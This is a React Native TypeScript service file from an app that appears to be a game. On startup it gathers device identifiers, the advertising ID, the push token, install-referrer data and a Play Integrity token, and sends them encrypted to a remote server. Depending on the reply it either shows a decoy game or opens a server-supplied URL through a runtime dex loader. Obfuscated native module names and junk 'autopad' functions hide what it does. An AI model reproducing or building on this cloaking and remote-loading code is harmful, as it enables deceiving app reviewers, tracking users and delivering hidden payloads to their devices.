/* @app-slot:service */
import { Utils, SendInitPayload, NormalizeWorkerBaseUrl } from './UtilService';
import { EncryptB64u as cryptoEncryptB64u, DecryptB64u as cryptoDecryptB64u } from './CryptoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finKey } from './nativeConstants';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions, NativeModules, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { InitializationState, InitTarget, AppenndSendId, GetAndroidId, GetAndroidUserAAgent, GetAppIdenier, GetAppVersion, InitializationRuntime } from './initializationShared';
import { openWithDex } from './dexLoader';
import { AssembleIntake, MapInitResponse } from './CfProtocol';

async function RequestPlayIntegrityToken(): Promise<string> {

  if (Platform.OS !== 'android') {
    return '';
  }
  try {
    const boguvuhacihulo = NativeModules.Okorifudubano?.boguvuhacihulo;
    if (typeof boguvuhacihulo !== 'function') {
      return '';
    }
    const token = await boguvuhacihulo();
    return typeof token === 'string' ? token : '';
  } catch {
    return '';
  }
}

export async function InitStep(): Promise<InitializationState | null> {

  try {
    const primaryWorkerUrl = await Utils.GetLink();
        if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const [appId, userAgent, androidId, appVersion, playIntegrityToken] =
      await Promise.all([
        GetAppIdenier(),
        GetAndroidUserAAgent(),
        GetAndroidId(),
        GetAppVersion(),
        RequestPlayIntegrityToken(),
      ]);
    const workerBaseUrl = NormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = InitializationRuntime.DeviceId;

    const namingValue = InitializationRuntime.FinlNaming;

    const CookieFields = ([
      appId ?? '',
      payloadDeviceId ?? '',
      InitializationRuntime.adId ?? '',
      InitializationRuntime.pushToken ?? '',
      InitializationRuntime.installRef ?? '',
      InitializationRuntime.FinlOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ]);

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}` +
      `&play_integrity_token=${encodeURIComponent(playIntegrityToken)}`;

    // v2: AssembleIntake returns {cookie,header,body} as b64url of PLAINTEXT CBOR bytes.
    const packed = JSON.parse(await AssembleIntake(CookieFields, bodyPlain)) as { cookie?: string; header?: string; body?: string };
    const encryptedCookie = cryptoEncryptB64u(packed.cookie || '');
    const dataValue = encodeURIComponent(encryptedCookie);
    const headerValue = encodeURIComponent(cryptoEncryptB64u(packed.header || ''));
    // cookieHeader is unused by native (tasutamefez prepends COOKIE_NAME itself).
    // encryptedBody is just the b64url wire — native prepends `<BODY_FIELD>=` from
    // its own per-project constant so JS stays wire-agnostic.
    const cookieHeader = dataValue;
    const encryptedBody = encodeURIComponent(cryptoEncryptB64u(packed.body || ''));

    try {
      const responseText = await SendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        headerValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.SetUserBlocke(1);
        await UnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await OnInitResponse(responseText, workerBaseUrl);
    } catch (rpcError) {

      await UnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {

    await UnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function OnInitResponse(responseText: string, workerBaseUrl: string): Promise<InitializationState> {

  try {
    // v2: wire is b64url of AES(CBOR(map)). Decrypt → b64url of plaintext bytes,
    // then native CBOR-decodes and maps numeric response codes.
    const decrytedResponse = cryptoDecryptB64u(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = await MapInitResponse(decrytedResponse);
      redirectUrl = obj.redirectUrl;
      redirectUrlInitial = obj.redirectUrlInitial;
      errorField = obj.error;
      blockUser = !!obj.blockUser;
          } catch (parseError) {

      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.SetUserBlocke(1);
      await UnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.SetUserBlocke(1);
      await UnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finKey, redirectUrlInitial);

      const finalUrl = AppenndSendId(
        redirectUrlInitial,
        InitializationRuntime.pendingSendId,
      );

      const opened = await openWithDex(workerBaseUrl, finalUrl);
      if (!opened) {
        return {
          isLoadPlaceholder: true,
          initTarget: InitTarget.game,
        };
      }

      return {
        isLoadPlaceholder: false,
        initTarget: InitTarget.webview,
      };
    }

    await UnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: InitTarget.game,
    };
  } catch (error) {

    await UnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function UnsubscribeFirebase(reason?: string): Promise<void> {

  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    InitializationRuntime.pushToken = '';
  } catch (error) {

    InitializationRuntime.pushToken = '';
  }
}

/* autopad-begin */
function dunixivafese(_ocopuleqo: boolean, _ijelorap: number): string { return "zalif"; }
function igezek(_xacobodadipa: string): number {
  let gezeve: number = 8;
  gezeve = 109;
  return gezeve;
}
function canamizata(_jedelipujoru: string): boolean {
  let imoxunasufof: boolean = true;
  imoxunasufof = true;
  return imoxunasufof;
}
function meqawedoc(_tilini: number, _nunogacezu: number): string {
  let coxojijolube: string = "ego";
  coxojijolube = "oraba";
  return coxojijolube;
}
function utulibo(_imutuga: string): number {
  const yocitimuruc = 31;
  const bakegum: number = 55;
  return bakegum;
}
function owupeku(_owufepekixup: number, _edavodataj: number): boolean { return true; }
function puneyepijoci(_iticugisa: boolean, _alozarajul: string): number {
  const kuyajipiqa: number = 95;
  return kuyajipiqa;
}
function wucomalib(_asoset: boolean): void {}
function ojayemu(_fijozi: string): string { return "eqakali"; }
function viwita(_pamifeni: string, _suracidiyip: number, _zupacosadose: boolean): void {
  const taficuni: boolean = false;
}
function mujuwasikizu(_ijakijozus: number, _bapoyu: number, _apoluzunimum: number): boolean { return false; }
function ugeyubuga(_ekopetovibu: string): string {
  let otocunag: string = "epukir";
  otocunag = "owe";
  return otocunag;
}
function iqivasozinik(): string {
  return "qubonul";
}
function ulovay(_arawodir: string, _nagefip: string, _yosutij: string): boolean {
  const runapi: boolean = true;
  return runapi;
}
function wuxupikabemi(_vicumi: number, _inozefinokal: boolean): string {
  let alolemetux: string = "epo";
  alolemetux = "onegu";
  return alolemetux;
}
function fumavizokub(_cexutanewaq: boolean, _mapukujumal: string, _utevixa: boolean): string {
  let ikafup: string = "udo";
  ikafup = "aza";
  return ikafup;
}
function zimometu(_voyofobemaz: number): string {
  let uluroxo: string = "beyekuka";
  uluroxo = "xatamiqu";
  return uluroxo;
}
/* autopad-end */

